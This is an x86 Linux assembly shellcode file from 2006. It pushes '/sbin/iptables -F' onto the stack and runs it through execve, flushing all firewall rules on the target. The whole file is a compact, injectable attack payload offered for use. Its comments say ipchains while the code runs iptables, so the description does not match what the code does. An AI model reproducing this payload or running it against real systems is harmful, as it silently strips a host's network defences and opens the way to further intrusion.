; By Kris Katterjohn 11/18/2006
; shellcode to flush ipchains for Linux x86

section .text
    global _start

_start:
    ; execve("/sbin/ipchains", { "/sbin/iptables", "-F", NULL }, NULL)
    push byte 11
    pop eax             ; eax = 11
    cdq                 ; edx = 0 (eax extend)
    push edx            ; push null byte to stack
    push word 0x462d    ; "F-"
    mov ecx, esp        ; ecx = pointer to "-F"
    push edx            ; push null byte to stack
    push word 0x7365    ; se 
    push 0x6c626174     ; lbat
    push 0x70692f6e     ; pi/n
    push 0x6962732f     ; ibs/
    mov ebx, esp        ; ebx = pointer to /sbin/iptables
    push edx            ; push edx (\0)
    push ecx            ; push ecx (-F)
    push ebx            ; push ebx (/sbin/iptables)
    mov ecx, esp        ; ecx = pointer to stack
    int 0x80            ; execve
